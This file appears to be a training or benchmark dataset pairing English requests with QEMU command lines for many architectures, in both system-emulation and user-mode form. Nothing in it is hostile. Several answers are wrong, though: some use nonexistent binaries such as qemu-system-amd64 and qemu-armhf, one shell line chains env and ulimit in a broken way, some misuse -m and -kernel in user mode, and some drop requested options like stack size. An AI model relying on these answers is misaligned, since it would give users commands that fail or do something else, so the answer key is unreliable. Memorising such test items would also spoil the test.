{"input": "Run a PowerPC 64-bit virtual machine with 2 CPU cores, 2GB of RAM, and enable a virtual Virtio block device with a raw disk image", "answer": "qemu-system-ppc64 -smp 2 -m 2048 -drive file=disk.img,if=none,id=drive0 -device virtio-blk-pci,drive=drive0"}
{"input": "Start a PowerPC 64-bit virtual machine with 1 CPU core, 1GB of RAM, and enable a virtual Virtio GPU device", "answer": "qemu-system-ppc64 -smp 1 -m 1024 -device virtio-gpu-pci"}
{"input": "Launch a PowerPC 64-bit virtual machine with 2 CPU cores, 2GB of RAM, and enable a virtual Virtio input device", "answer": "qemu-system-ppc64 -smp 2 -m 2048 -device virtio-input-pci"}
{"input": "Start a QEMU virtual machine with a PowerPC 64-bit Little Endian architecture, using 4 CPUs, 2GB of RAM, and a raw disk image named `disk.img`", "answer": "qemu-system-ppc64le -smp 4 -m 2G -hda disk.img"}
{"input": "Launch a QEMU virtual machine with PowerPC 64-bit Little Endian architecture, using KVM acceleration, 8 CPUs, 4GB of RAM, and a CD-ROM image named `boot.iso`", "answer": "qemu-system-ppc64le -accel kvm -smp 8 -m 4G -cdrom boot.iso"}
{"input": "Start a QEMU virtual machine with PowerPC 64-bit Little Endian architecture, using a custom machine type, 2 CPUs, 1GB of RAM, and a network interface connected to a user-mode network stack", "answer": "qemu-system-ppc64le -machine pseries -smp 2 -m 1G -netdev user,id=mynet0 -device virtio-net-pci,netdev=mynet0"}
{"input": "Run a QEMU virtual machine with PowerPC 64-bit Little Endian architecture, using 1 CPU, 512MB of RAM, and redirect the serial output to a file named `serial.log`", "answer": "qemu-system-ppc64le -smp 1 -m 512M -serial file:serial.log"}
{"input": "Start a QEMU virtual machine with PowerPC 64-bit Little Endian architecture, using 4 CPUs, 2GB of RAM, and a VNC display server listening on port 5901", "answer": "qemu-system-ppc64le -smp 4 -m 2G -display vnc=:1"}
{"input": "Start a QEMU virtual machine with PowerPC 64-bit Little Endian architecture, using 1 CPU, 256MB of RAM, and boot from a kernel image named `vmlinux` with an initial RAM disk named `initrd.img`", "answer": "qemu-system-ppc64le -smp 1 -m 256M -kernel vmlinux -initrd initrd.img"}
{"input": "Start a QEMU virtual machine with PowerPC 64-bit Little Endian architecture, using 2 CPUs, 1GB of RAM, and a custom BIOS image named `bios.bin`", "answer": "qemu-system-ppc64le -smp 2 -m 1G -bios bios.bin"}
{"input": "Launch a QEMU virtual machine with PowerPC 64-bit Little Endian architecture, using 1 CPU, 512MB of RAM, and a graphical output disabled (headless mode)", "answer": "qemu-system-ppc64le -smp 1 -m 512M -nographic"}
{"input": "Start a RISC-V 32-bit emulator with 512 MB of RAM and a raw disk image named `disk.img`", "answer": "qemu-system-riscv32 -m 512M -hda disk.img"}
{"input": "Emulate a RISC-V 32-bit machine with 2 CPUs, 1 GB of RAM, and a CD-ROM image named `boot.iso`", "answer": "qemu-system-riscv32 -smp 2 -m 1G -cdrom boot.iso"}
{"input": "Start a RISC-V 32-bit emulator with 1 CPU, 128 MB of RAM, and redirect serial output to a file named `serial.log`", "answer": "qemu-system-riscv32 -smp 1 -m 128M -serial file:serial.log"}
{"input": "Emulate a RISC-V 32-bit machine with 4 CPUs, 2 GB of RAM, and use a BIOS file named `bios.bin`", "answer": "qemu-system-riscv32 -smp 4 -m 2G -bios bios.bin"}
{"input": "Start a RISC-V 32-bit emulator with 1 CPU, 256 MB of RAM, and disable graphical output to run in headless mode", "answer": "qemu-system-riscv32 -smp 1 -m 256M -nographic"}
{"input": "Emulate a RISC-V 32-bit machine with 2 CPUs, 1 GB of RAM, and use a device tree blob file named `dtb.img`", "answer": "qemu-system-riscv32 -smp 2 -m 1G -dtb dtb.img"}
{"input": "Start a RISC-V 32-bit emulator with 1 CPU, 128 MB of RAM, and use a parallel flash image named `pflash.img`", "answer": "qemu-system-riscv32 -smp 1 -m 128M -pflash pflash.img"}
{"input": "Start a RISC-V virtual machine with 2 CPUs, 4GB of RAM, and use a raw disk image named `disk.img`", "answer": "qemu-system-riscv64 -smp 2 -m 4G -hda disk.img"}
{"input": "Start a RISC-V virtual machine with 1 CPU, 512MB of RAM, and redirect serial output to a file named `serial.log`", "answer": "qemu-system-riscv64 -smp 1 -m 512M -serial file:serial.log"}
{"input": "Launch a RISC-V virtual machine with 2 CPUs, 1GB of RAM, and use a custom kernel image named `vmlinux` with an initial RAM disk named `initrd.img`", "answer": "qemu-system-riscv64 -smp 2 -m 1G -kernel vmlinux -initrd initrd.img"}
{"input": "Run a RISC-V virtual machine with 4 CPUs, 2GB of RAM, and enable a VNC server for remote display on port 5901", "answer": "qemu-system-riscv64 -smp 4 -m 2G -vnc :1"}
{"input": "Start a RISC-V virtual machine with 1 CPU, 1GB of RAM, and use a custom BIOS file named `bios.bin`", "answer": "qemu-system-riscv64 -smp 1 -m 1G -bios bios.bin"}
{"input": "Start a QEMU virtual machine with the s390x architecture, using 2 CPUs, 4GB of RAM, and a raw disk image named `disk.img`", "answer": "qemu-system-s390x -smp 2 -m 4G -hda disk.img"}
{"input": "Launch a QEMU s390x virtual machine with KVM acceleration, 8 CPUs, 8GB of RAM, and a CD-ROM image named `install.iso`", "answer": "qemu-system-s390x -accel kvm -smp 8 -m 8G -cdrom install.iso"}
{"input": "Run a QEMU s390x virtual machine with 1 CPU, 2GB of RAM, and a network interface connected to a user-mode network stack with DHCP", "answer": "qemu-system-s390x -smp 1 -m 2G -netdev user,id=mynet0 -device virtio-net,netdev=mynet0"}
{"input": "Start a QEMU s390x virtual machine with 4 CPUs, 16GB of RAM, and a VNC display server listening on port 5901", "answer": "qemu-system-s390x -smp 4 -m 16G -display vnc=:1"}
{"input": "Launch a QEMU s390x virtual machine with 4 CPUs, 8GB of RAM, and a Virtio-based block device using the disk image `disk.img`", "answer": "qemu-system-s390x -smp 4 -m 8G -drive file=disk.img,if=virtio,format=raw"}
{"input": "Start a QEMU SPARC emulator with 2 CPUs, 4GB of RAM, and use a raw disk image named `sparc_disk.img` as the primary hard drive", "answer": "qemu-system-sparc -smp 2 -m 4G -hda sparc_disk.img"}
{"input": "Start a QEMU SPARC emulator with a custom machine type `sun4m`, 1 CPU, 2GB of RAM, and use a raw disk image named `sparc_disk.img`", "answer": "qemu-system-sparc -machine sun4m -smp 1 -m 2G -hda sparc_disk.img"}
{"input": "Launch a QEMU SPARC emulator with a VNC display, 1 CPU, 1GB of RAM, and a raw disk image named `sparc_disk.img`", "answer": "qemu-system-sparc -smp 1 -m 1G -hda sparc_disk.img -display vnc=:1"}
{"input": "Start a QEMU SPARC emulator with a custom kernel image `vmlinux`, an initial RAM disk `initrd.img`, and 512MB of RAM", "answer": "qemu-system-sparc -kernel vmlinux -initrd initrd.img -m 512M"}
{"input": "Launch a QEMU SPARC emulator with a user-mode network backend, 1 CPU, 1GB of RAM, and a raw disk image named `sparc_disk.img`", "answer": "qemu-system-sparc -smp 1 -m 1G -hda sparc_disk.img -netdev user,id=net0 -device e1000,netdev=net0"}
{"input": "Launch a QEMU SPARC emulator with a serial port redirected to a PTY, 1 CPU, 1GB of RAM, and a raw disk image named `sparc_disk.img`", "answer": "qemu-system-sparc -smp 1 -m 1G -hda sparc_disk.img -serial pty"}
{"input": "Start a QEMU SPARC emulator with a custom BIOS image `bios.bin`, 1 CPU, 512MB of RAM, and a raw disk image named `sparc_disk.img`", "answer": "qemu-system-sparc -bios bios.bin -smp 1 -m 512M -hda sparc_disk.img"}
{"input": "Start a SPARC64 virtual machine with a CD-ROM image `ubuntu.iso` and boot from it", "answer": "qemu-system-sparc64 -cdrom ubuntu.iso -boot order=d"}
{"input": "Launch a SPARC64 virtual machine with 2 CPUs, 4GB of RAM, and use a VNC display for graphical output", "answer": "qemu-system-sparc64 -smp 2 -m 4G -display vnc=:1"}
{"input": "Start a SPARC64 virtual machine with 1 CPU, 1GB of RAM, and use a custom BIOS file named `custom_bios.bin`", "answer": "qemu-system-sparc64 -smp 1 -m 1G -bios custom_bios.bin"}
{"input": "Start a KVM virtual machine with 1 CPU, 1GB of RAM, and use a custom BIOS file named `bios.bin`", "answer": "kvm -smp 1 -m 1G -bios bios.bin disk.img"}
{"input": "Run a QEMU virtual machine with 1 CPU, 2GB of RAM, and redirect the serial output to a file named `serial.log`", "answer": "qemu-system-amd64 -smp 1 -m 2G -serial file:serial.log"}
{"input": "Launch a QEMU virtual machine with 1 CPU, 1GB of RAM, and use a kernel image named `vmlinuz` with an initial RAM disk `initrd.img`", "answer": "qemu-system-amd64 -smp 1 -m 1G -kernel vmlinuz -initrd initrd.img"}
{"input": "Start a QEMU virtual machine with 2 CPUs, 4GB of RAM, and use a raw disk image named `disk.img` as the primary hard drive", "answer": "qemu-system-i386 -smp 2 -m 4G -hda disk.img"}
{"input": "Start a QEMU virtual machine with a CD-ROM image `cdrom.iso` and enable a user-mode network backend with DHCP", "answer": "qemu-system-i386 -cdrom cdrom.iso -netdev user,id=mynet0 -device e1000,netdev=mynet0"}
{"input": "Start a QEMU virtual machine with a VGA display, 512MB of RAM, and use a floppy disk image `floppy.img`", "answer": "qemu-system-i386 -vga std -m 512M -fda floppy.img"}
{"input": "Run a QEMU virtual machine with no graphical output and redirect the serial I/O to the console", "answer": "qemu-system-i386 -nographic -serial mon:stdio"}
{"input": "Launch a QEMU virtual machine with KVM acceleration, 8GB of RAM, and a CD-ROM image named \"ubuntu.iso\"", "answer": "qemu-system-x86_64 -accel kvm -m 8G -cdrom ubuntu.iso"}
{"input": "Run a QEMU virtual machine with 4 CPUs, 8GB of RAM, and a network interface connected to a user-mode network stack", "answer": "qemu-system-x86_64 -smp 4 -m 8G -netdev user,id=mynet0 -device e1000,netdev=mynet0"}
{"input": "Launch a QEMU virtual machine with 2 CPUs, 4GB of RAM, and a VNC display server listening on port 5901", "answer": "qemu-system-x86_64 -smp 2 -m 4G -display vnc=:1"}
{"input": "Run a QEMU virtual machine with 1 CPU, 512MB of RAM, and no graphical output (headless mode)", "answer": "qemu-system-x86_64 -smp 1 -m 512M -nographic"}
{"input": "Launch a QEMU virtual machine with 4 CPUs, 8GB of RAM, and a sound device using the ALSA backend", "answer": "qemu-system-x86_64 -smp 4 -m 8G -audiodev alsa,id=snd0 -device intel-hda -device hda-duplex,audiodev=snd0"}
{"input": "Launch a QEMU virtual machine with 1 CPU, 1GB of RAM, and a virtio-blk device connected to a raw disk image named \"disk.img\"", "answer": "qemu-system-x86_64 -smp 1 -m 1G -drive file=disk.img,if=virtio,format=raw"}
{"input": "Run a QEMU virtual machine with 2 CPUs, 4GB of RAM, and a TPM (Trusted Platform Module) device using the passthrough backend", "answer": "qemu-system-x86_64 -smp 2 -m 4G -tpmdev passthrough,id=tpm0 -device tpm-tis,tpmdev=tpm0"}
{"input": "Launch a QEMU virtual machine with 1 CPU, 2GB of RAM, and a virtio-scsi device connected to a raw disk image named \"data.img\"", "answer": "qemu-system-x86_64 -smp 1 -m 2G -drive file=data.img,if=none,id=drive0 -device virtio-scsi-pci -device scsi-hd,drive=drive0"}
{"input": "Start a QEMU virtual machine with 1 CPU, 1GB of RAM, and a virtio-rng device for random number generation", "answer": "qemu-system-x86_64 -smp 1 -m 1G -device virtio-rng-pci"}
{"input": "Launch a QEMU virtual machine with 4 CPUs, 16GB of RAM, and a custom machine type \"pc-q35-6.2\"", "answer": "qemu-system-x86_64 -smp 4 -m 16G -machine pc-q35-6.2"}
{"input": "Run a QEMU virtual machine with 2 CPUs, 4GB of RAM, and a custom CPU model \"IvyBridge\"", "answer": "qemu-system-x86_64 -smp 2 -m 4G -cpu IvyBridge"}
{"input": "Start a QEMU virtual machine with 1 CPU, 512MB of RAM, and a custom kernel image \"vmlinuz\" with an initrd file \"initrd.img\" and a custom command line \"root=/dev/sda1\"", "answer": "qemu-system-x86_64 -smp 1 -m 512M -kernel vmlinuz -initrd initrd.img -append \"root=/dev/sda1\""}
{"input": "Launch a QEMU virtual machine with 2 CPUs, 4GB of RAM, and a custom monitor socket for QMP (QEMU Machine Protocol) communication", "answer": "qemu-system-x86_64 -smp 2 -m 4G -qmp unix:/tmp/qmp-sock,server,nowait"}
{"input": "Start a QEMU virtual machine with 4 CPUs, 8GB of RAM, and a custom snapshot of the VM state named \"snapshot1\"", "answer": "qemu-system-x86_64 -smp 4 -m 8G -loadvm snapshot1"}
{"input": "Start a QEMU virtual machine with 2 CPUs, 4GB of RAM, and a custom memory backend file named \"mem-backend-file\"", "answer": "qemu-system-x86_64 -smp 2 -m 4G -object memory-backend-file,id=mem0,size=4G,mem-path=mem-backend-file -numa node,memdev=mem0"}
{"input": "Run a program named `example` with the QEMU aarch64 emulator, logging system calls to debug its behavior", "answer": "qemu-aarch64 -strace example"}
{"input": "Execute a program named `debug_app` with QEMU aarch64, enabling logging for memory operations and writing the logs to a file named `debug.log`", "answer": "qemu-aarch64 -d mem -D debug.log debug_app"}
{"input": "Run a program named `test` with QEMU aarch64, forcing the `argv[0]` value to be `custom_name`", "answer": "qemu-aarch64 -0 custom_name test"}
{"input": "Debug a program named `debug_me` using the QEMU aarch64_be emulator, waiting for a GDB connection on port 1234 and setting the ELF interpreter prefix to `/custom/path`", "answer": "qemu-aarch64_be -g 1234 -L /custom/path ./debug_me"}
{"input": "Emulate a program named `app` with the QEMU aarch64_be emulator, enabling logging for CPU and memory operations and writing the logs to `qemu_log.txt`", "answer": "qemu-aarch64_be -d cpu,mem -D qemu_log.txt ./app"}
{"input": "Run a program named `my_program` with the QEMU aarch64_be emulator, enabling tracing for specific events defined in `events.txt` and writing the trace output to `trace.log`", "answer": "qemu-aarch64_be -trace events=events.txt,file=trace.log ./my_program"}
{"input": "Run a program named `my_program` with the QEMU Alpha emulator, setting the stack size to 16MB and using the `/custom/path` as the ELF interpreter prefix", "answer": "qemu-alpha -L /custom/path my_program"}
{"input": "Execute a binary named `test_binary` with the environment variable `DEBUG=1` set and unset the `LD_PRELOAD` variable using qemu-amd64", "answer": "qemu-amd64 -E DEBUG=1 -U LD_PRELOAD ./test_binary"}
{"input": "Execute a binary named `example` with the CPU model set to `host` and enable logging for memory operations using qemu-amd64", "answer": "qemu-amd64 -cpu host -d mem ./example"}
{"input": "Run an ARM binary named \"app\" with logging enabled for memory access and CPU state, and write the logs to a file named \"log.txt\"", "answer": "qemu-arm -d cpu,mem -D log.txt ./app"}
{"input": "Run an ARM binary named \"app\" with one guest instruction per emulated translation block", "answer": "qemu-arm -one-insn-per-tb ./app"}
{"input": "Emulate an ARM binary named \"program\" and display the version information of QEMU", "answer": "qemu-arm -version && qemu-arm ./program"}
{"input": "Run an ARM binary named \"app\" with a custom argv[0] set to \"custom_name\"", "answer": "qemu-arm -0 custom_name ./app"}
{"input": "Debug a program named `debug_me` using QEMU ARM big-endian emulator, waiting for a GDB connection on port 1234", "answer": "qemu-armeb -g 1234 ./debug_me"}
{"input": "Execute a program named `app` with the ARM big-endian emulator, logging all system calls to a file named `syscall_log.txt`", "answer": "qemu-armeb -strace -D syscall_log.txt ./app"}
{"input": "Run a program named `example` with the ARM big-endian emulator, setting the ELF interpreter prefix to `/custom/path` and using a custom uname release string `custom-release`", "answer": "qemu-armeb -L /custom/path -r custom-release ./example"}
{"input": "Execute a program named `my_app` with the ARM big-endian emulator, enabling logging for CPU and memory operations and writing the logs to `cpu_mem_log.txt`", "answer": "qemu-armeb -d cpu,mem -D cpu_mem_log.txt ./my_app"}
{"input": "Execute a program named `app` with the ARM big-endian emulator, enabling tracing for specific events defined in `events.txt` and writing the trace output to `trace_output.txt`", "answer": "qemu-armeb -trace events=events.txt,file=trace_output.txt ./app"}
{"input": "Run an ARM binary named `my_program` using QEMU with the default settings", "answer": "qemu-armhf ./my_program"}
{"input": "Run an ARM binary named `my_program` and set the guest base address to `0x40000000`", "answer": "qemu-arm -R 0x40000000 ./my_program"}
{"input": "Run an ARM binary named `my_program` and enable logging for memory operations and CPU state", "answer": "qemu-armhf -d cpu,mem ./my_program"}
{"input": "Run an ARM binary named `my_program` and set the ELF interpreter prefix to `/custom/path`", "answer": "qemu-armhf -L /custom/path ./my_program"}
{"input": "Run a program named \"app\" using qemu-hexagon, set the environment variable \"DEBUG=1\", and unset the environment variable \"LD_PRELOAD\"", "answer": "qemu-hexagon -E DEBUG=1 -U LD_PRELOAD app"}
{"input": "Emulate a program named `test_app` using qemu-hppa with the CPU model set to `PA8500` and log all memory access operations", "answer": "qemu-hppa -cpu PA8500 -d mem ./test_app"}
{"input": "Run a program named `my_app` using qemu-hppa, set the environment variable `DEBUG=1`, and unset the environment variable `LD_PRELOAD`", "answer": "qemu-hppa -E DEBUG=1 -U LD_PRELOAD ./my_app"}
{"input": "Run a program named `test` using qemu-i386 and write logs to a file named `log.txt`", "answer": "qemu-i386 test > log.txt 2>&1"}
{"input": "Run a program named `my_program` using qemu-i386 and set the ELF interpreter prefix to `/custom/path`", "answer": "qemu-i386 -L /custom/path my_program"}
{"input": "Emulate a program named `example` using qemu-i386 and enable logging for memory operations", "answer": "qemu-i386 -d mem example"}
{"input": "Emulate a program named `app` using qemu-i386 and run with one guest instruction per emulated translation block", "answer": "qemu-i386 -one-insn-per-tb app"}
{"input": "Run a program named `app` and reserve 256MB of virtual address space for the guest using qemu-loong64", "answer": "qemu-loong64 -m 256M -kernel ./app"}
{"input": "Execute a program named `test_app` with the LoongArch64 emulator, setting the environment variable `DEBUG=1` and unsetting `LD_PRELOAD`", "answer": "qemu-loongarch64 -E DEBUG=1 -U LD_PRELOAD test_app"}
{"input": "Execute a program named `app` with the LoongArch64 emulator, enabling logging for CPU and memory operations", "answer": "qemu-loongarch64 -d cpu,mem app"}
{"input": "Execute a program named `test` with the LoongArch64 emulator, reserving 256MB of virtual address space for the guest", "answer": "qemu-loongarch64 -R 268435456 test"}
{"input": "Execute a program named `binary` with the LoongArch64 emulator, forcing the target process's `argv[0]` to be `custom_name`", "answer": "qemu-loongarch64 -0 custom_name binary"}
{"input": "Execute a program named `app` with the LoongArch64 emulator, enabling tracing for specific events defined in `events.txt`", "answer": "qemu-loongarch64 -trace events=events.txt app"}
{"input": "Run a program named `example` with logging enabled for memory operations and write the logs to a file named `log.txt` using qemu-m68k", "answer": "qemu-m68k -d mem -D log.txt example"}
{"input": "Run a program named `test` with one guest instruction per emulated translation block using qemu-m68k", "answer": "qemu-m68k -one-insn-per-tb test"}
{"input": "Run a program named `app` with system call logging enabled using qemu-m68k", "answer": "qemu-m68k -strace app"}
{"input": "Emulate a program named `example` with QEMU MicroBlaze, setting the ELF interpreter prefix to `/custom/path`", "answer": "qemu-microblaze -L /custom/path example"}
{"input": "Run a program named `app` with QEMU MicroBlaze, logging system calls to the console", "answer": "qemu-microblaze -strace app"}
{"input": "Emulate a program called `test` with the QEMU microblazeel emulator, enabling logging for memory operations and writing the logs to a file named `log.txt`", "answer": "qemu-microblazeel -d mem -D log.txt test"}
{"input": "Emulate a MIPS binary named `example` with logging enabled for memory operations and write the logs to a file named `qemu_log.txt`", "answer": "qemu-mips -d mem -D qemu_log.txt ./example"}
{"input": "Run a MIPS binary named `test` with a custom uname release string `custom_release` and force the target process's `argv[0]` to be `custom_name`", "answer": "qemu-mips -r custom_release -0 custom_name ./test"}
{"input": "Run a MIPS binary named `app` with a custom environment variable `PATH=/custom/bin` and unset the `LD_PRELOAD` environment variable", "answer": "qemu-mips -E PATH=/custom/bin -U LD_PRELOAD ./app"}
{"input": "Emulate a MIPS64 binary named `app` with a custom ELF interpreter prefix `/custom/path` and set the environment variable `DEBUG=1`", "answer": "qemu-mips64 -L /custom/path -E DEBUG=1 ./app"}
{"input": "Debug a MIPS64el binary named `debug_me` by waiting for a GDB connection on port 1234 and logging all executed instructions", "answer": "qemu-mips64el -g 1234 -d in_asm ./debug_me"}
{"input": "Run a MIPS64el binary named `my_program` with the environment variable `DEBUG=1` set and unset the `LD_PRELOAD` variable", "answer": "qemu-mips64el -E DEBUG=1 -U LD_PRELOAD ./my_program"}
{"input": "Emulate a MIPS ELF binary named \"app\" with a custom CPU model \"24Kf\" and log all system calls to the console", "answer": "qemu-mipsel -cpu 24Kf -strace ./app"}
{"input": "Execute a MIPS ELF binary named \"example\" with a reserved virtual address space of 256MB and log all memory access events to a file named \"mem_log.txt\"", "answer": "qemu-mipsel -R 268435456 -d mem_access -D mem_log.txt ./example"}
{"input": "Debug a MIPS N32 binary named `debug_me` by waiting for a GDB connection on port 1234 and logging all system calls", "answer": "qemu-mipsn32 -g 1234 -strace ./debug_me"}
{"input": "Execute a MIPS N32 binary named `my_app` with a custom ELF interpreter prefix `/custom/lib` and reserve 256 MB of virtual address space for the guest", "answer": "qemu-mipsn32 -L /custom/lib -R 268435456 ./my_app"}
{"input": "Execute a MIPS N32 binary named `analyze_data` with a custom uname release string `custom_kernel` and enable logging of CPU operations", "answer": "qemu-mipsn32 -r custom_kernel -d cpu ./analyze_data"}
{"input": "Run a MIPS N32 little-endian binary named `test_program` with a custom stack size of 16 MB and log all system calls", "answer": "qemu-mipsn32el -strace ./test_program"}
{"input": "Emulate a MIPS N32 little-endian binary named `app` with a custom ELF interpreter prefix `/custom/path` and set the environment variable `DEBUG=1`", "answer": "qemu-mipsn32el -L /custom/path -E DEBUG=1 ./app"}
{"input": "Emulate a MIPS N32 little-endian binary named `test` with a custom uname release string `custom-release` and log all executed instructions", "answer": "qemu-mipsn32el -r custom-release -d in_asm ./test"}
{"input": "Debug a MIPS N32 little-endian binary named `debug_app` with a custom stack size of 32 MB, a GDB connection on port 5678, and log all CPU state changes", "answer": "qemu-mipsn32el -gdb tcp::5678 -d cpu ./debug_app"}
{"input": "Emulate a PowerPC program named `test_app` with a custom ELF interpreter prefix `/custom/path` and log all system calls to the console", "answer": "qemu-powerpc -L /custom/path -strace ./test_app"}
{"input": "Execute a PowerPC program named `binary` with a custom CPU model `750` and enable logging for memory operations", "answer": "qemu-powerpc -cpu 750 -d mem ./binary"}
{"input": "Emulate a PowerPC program named \"demo\" with the ELF interpreter prefix set to \"/custom/path\" and log all memory access operations to a file named \"memory.log\"", "answer": "qemu-ppc -L /custom/path -d mem -D memory.log ./demo"}
{"input": "Run a PowerPC 64-bit Little Endian (ppc64le) binary named `server` and unset the `LD_PRELOAD` environment variable for the target process", "answer": "env -u LD_PRELOAD qemu-ppc64le ./server"}
{"input": "Run a PowerPC 64-bit Little Endian (ppc64le) binary named `my_app` and enable tracing for specific events defined in a file named `events.txt`", "answer": "qemu-ppc64el -trace events=events.txt ./my_app"}
{"input": "Run a program named `app` with a custom stack size of 32MB and unset the environment variable `LD_PRELOAD` for the target process", "answer": "env -u LD_PRELOAD ulimit -s 32768 && ./app"}
{"input": "Emulate a RISC-V 32-bit program named `demo` with logging enabled for memory operations and write the logs to a file named `log.txt`", "answer": "qemu-riscv32 -d mem -D log.txt ./demo"}
{"input": "Run a RISC-V 64-bit program named `example` with logging enabled for memory operations and write the logs to a file named `log.txt`", "answer": "qemu-riscv64 -d mem -D log.txt ./example"}
{"input": "Run a program named `app` with the environment variable `DEBUG=1` and unset the `LD_PRELOAD` variable using qemu-s390x", "answer": "qemu-s390x -E DEBUG=1 -U LD_PRELOAD app"}
{"input": "Run a program named `my_program` and reserve 256 MB of virtual address space for the guest using qemu-s390x", "answer": "qemu-s390x -m 256 my_program"}
{"input": "Debug a program named `debug_me` using qemu-sh4 and wait for a GDB connection on port 1234", "answer": "qemu-sh4 -g 1234 ./debug_me"}
{"input": "Run a program named `log_me` with qemu-sh4, enabling logging for memory operations and writing the logs to a file named `log.txt`", "answer": "qemu-sh4 -d mem -D log.txt ./log_me"}
{"input": "Run a program named `my_app` with qemu-sh4, forcing the `argv[0]` to be `custom_name`", "answer": "qemu-sh4 -0 custom_name ./my_app"}
{"input": "Run a program named `test_program` with qemu-sh4, reserving 256MB of virtual address space for the guest", "answer": "qemu-sh4 -m 256 ./test_program"}
{"input": "Run a program named `my_program` with qemu-sh4, enabling one guest instruction per translated block", "answer": "qemu-sh4 -one-insn-per-tb ./my_program"}
{"input": "Emulate a program named `app` with QEMU SH4EB, setting the guest base address to `0x80000000` and reserving 256MB of virtual address space", "answer": "qemu-sh4eb -B 0x80000000 -R 268435456 ./app"}
{"input": "Run a program named `my_app` with QEMU SH4EB, setting the environment variable `DEBUG=1` and unsetting the `LD_PRELOAD` variable", "answer": "qemu-sh4eb -E DEBUG=1 -U LD_PRELOAD ./my_app"}
{"input": "Emulate a program named `test` with QEMU SH4EB, logging system calls and writing the logs to a file named `syscall_log.txt`", "answer": "qemu-sh4eb -strace -D syscall_log.txt ./test"}
{"input": "Run a program named `example_app` with QEMU SH4EB, setting a seed for the pseudo-random number generator and enabling tracing for specific events defined in `events.txt`", "answer": "qemu-sh4eb -trace events=events.txt ./example_app"}
{"input": "Run a SPARC binary named `my_app` with a custom ELF interpreter prefix `/custom/lib` and log all system calls to the console", "answer": "qemu-sparc -L /custom/lib -strace ./my_app"}
{"input": "Set the ELF interpreter prefix to `/custom/path` and run a program using qemu-x86_64", "answer": "qemu-x86_64 -L /custom/path ./my_program"}
{"input": "Run a program with a custom CPU model (e.g., `core2duo`) using qemu-x86_64", "answer": "qemu-x86_64 -cpu core2duo ./my_program"}
{"input": "Set the environment variable `LD_PRELOAD=/lib/custom.so` and unset `LD_DEBUG` for a program running in qemu-x86_64", "answer": "qemu-x86_64 -E LD_PRELOAD=/lib/custom.so -U LD_DEBUG ./my_program"}
{"input": "Enable logging for memory operations and write the logs to `logfile.txt` while running a program in qemu-x86_64", "answer": "qemu-x86_64 -d mem -D logfile.txt ./my_program"}
{"input": "Emulate a program named `test` using the QEMU Xtensa emulator, set the ELF interpreter prefix to `/custom/path`, and write logs to a file named `log.txt`", "answer": "qemu-xtensa -L /custom/path -D log.txt ./test"}
{"input": "Run a program named `example` using the QEMU Xtensa emulator, enable tracing for all events, and write the trace output to a file named `trace.log`", "answer": "qemu-xtensa -trace enable=*,file=trace.log ./example"}
{"input": "Emulate a program named `my_app` using qemu-xtensaeb, set the environment variable `DEBUG=1`, and log system calls", "answer": "qemu-xtensaeb -E DEBUG=1 -strace ./my_app"}
{"input": "Emulate a program named `app` using qemu-xtensaeb, set the CPU model to `dc233c`, and enable logging for memory operations", "answer": "qemu-xtensaeb -cpu dc233c -d mem ./app"}
{"input": "Run a program named `binary` using qemu-xtensaeb, set the ELF interpreter prefix to `/custom/path`, and force the target process's `argv[0]` to be `custom_name`", "answer": "qemu-xtensaeb -L /custom/path -0 custom_name ./binary"}
{"input": "Run an ARM64 binary named `custom_app` using `qemu-aarch64-static` with the `argv[0]` set to `custom_name` and unset the environment variable `LD_PRELOAD` for the target process", "answer": "qemu-aarch64-static -0 custom_name -U LD_PRELOAD ./custom_app"}
{"input": "Emulate a program compiled for aarch64_be architecture, wait for a GDB connection on port 1234, and set the ELF interpreter prefix to `/custom/path`", "answer": "qemu-aarch64_be-static -g 1234 -L /custom/path ./my_program"}
{"input": "Emulate a program compiled for aarch64_be architecture, force the target process `argv[0]` to be `custom_name`, and set the QEMU uname release string to `custom_release`", "answer": "qemu-aarch64_be-static -0 custom_name -r custom_release ./my_program"}
{"input": "Run a program compiled for aarch64_be architecture, enable tracing for specific events defined in `events.txt`, and write the trace output to `trace.log`", "answer": "qemu-aarch64_be-static -trace events=events.txt,file=trace.log ./my_program"}
{"input": "Emulate a program named \"binary\" using qemu-alpha-static, set the CPU model to \"ev67\", and unset the environment variable \"LD_PRELOAD\" for the target process", "answer": "qemu-alpha-static -cpu ev67 -U LD_PRELOAD ./binary"}
{"input": "Run a program with qemu-amd64-static and set the environment variable `DEBUG=1` for the target process", "answer": "qemu-amd64-static -E DEBUG=1 ./my_program"}
{"input": "Emulate a program with qemu-amd64-static and unset the `LD_PRELOAD` environment variable for the target process", "answer": "env -u LD_PRELOAD qemu-amd64-static ./my_program"}
{"input": "Use qemu-amd64-static to emulate a program and enable logging for CPU and memory operations", "answer": "qemu-amd64-static -d cpu,mem ./my_program"}
{"input": "Emulate a program with qemu-amd64-static and reserve 256MB of virtual address space for the guest", "answer": "qemu-amd64-static -R 268435456 ./my_program"}
{"input": "Use `qemu-arm-static` to run an ARM binary `app` while unsetting the environment variable `LD_PRELOAD` for the target process", "answer": "qemu-arm-static -U LD_PRELOAD ./app"}
{"input": "Execute an ARM binary `my_program` with `qemu-arm-static`, forcing the target process's `argv[0]` to be `custom_name`", "answer": "qemu-arm-static -0 custom_name ./my_program"}
{"input": "Execute an ARM binary `test` with `qemu-arm-static`, enabling one guest instruction per emulated translation block", "answer": "qemu-arm-static -one-insn-per-tb ./test"}
{"input": "Emulate a program named `example` using `qemu-arm64-static` with logging enabled for memory operations and write the logs to a file named `log.txt`", "answer": "qemu-arm64-static -d mem -D log.txt ./example"}
{"input": "Execute an ARM big-endian binary \"app\" with the environment variable `DEBUG=1` set and unset the `LD_PRELOAD` variable", "answer": "qemu-armeb-static -E DEBUG=1 -U LD_PRELOAD ./app"}
{"input": "Run an ARM big-endian binary \"test\" with a custom ELF interpreter prefix located at `/custom/path`", "answer": "qemu-armeb-static -L /custom/path ./test"}
{"input": "Debug an ARM big-endian binary \"debug_me\" by waiting for a GDB connection on port 1234", "answer": "qemu-armeb-static -g 1234 ./debug_me"}
{"input": "Execute an ARM big-endian binary \"program\" with the CPU model set to `cortex-a15`", "answer": "qemu-armeb-static -cpu cortex-a15 ./program"}
{"input": "Run an ARM big-endian binary \"example\" and log all system calls to the console", "answer": "qemu-armeb-static -strace ./example"}
{"input": "Execute an ARM big-endian binary \"app\" with a custom guest base address of `0x10000000`", "answer": "qemu-armeb-static -B 0x10000000 ./app"}
{"input": "Run an ARM big-endian binary \"test\" with logging enabled for memory operations and write the logs to a file named `log.txt`", "answer": "qemu-armeb-static -d mem -D log.txt ./test"}
